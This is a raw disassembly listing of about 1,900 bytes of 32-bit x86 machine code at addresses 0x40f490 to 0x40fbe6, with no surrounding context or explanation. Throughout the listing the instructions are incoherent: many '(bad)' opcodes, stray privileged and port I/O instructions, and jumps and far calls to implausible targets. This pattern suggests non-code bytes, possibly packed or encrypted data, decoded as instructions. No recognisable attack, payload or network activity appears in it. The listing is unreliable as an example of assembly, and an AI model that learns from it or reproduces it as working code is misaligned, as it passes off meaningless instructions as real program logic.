  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
  40f53e:	add    BYTE PTR [ebp+0x458bf800],0x85
  40f545:	xor    DWORD PTR [edi],ecx
  40f547:	pushf  
  40f548:	js     0x40f511
  40f54a:	add    al,dh
  40f54c:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  40f552:	inc    eax
  40f553:	xor    eax,0x8b209f89
  40f558:	call   FWORD PTR [ebx+ecx*4]
  40f55b:	cmp    al,0x1
  40f55e:	mov    DWORD PTR [eax],0x8b8545c3
  40f564:	call   FWORD PTR [edi+edi*8]
  40f567:	dec    ebp
  40f568:	inc    ebp
  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
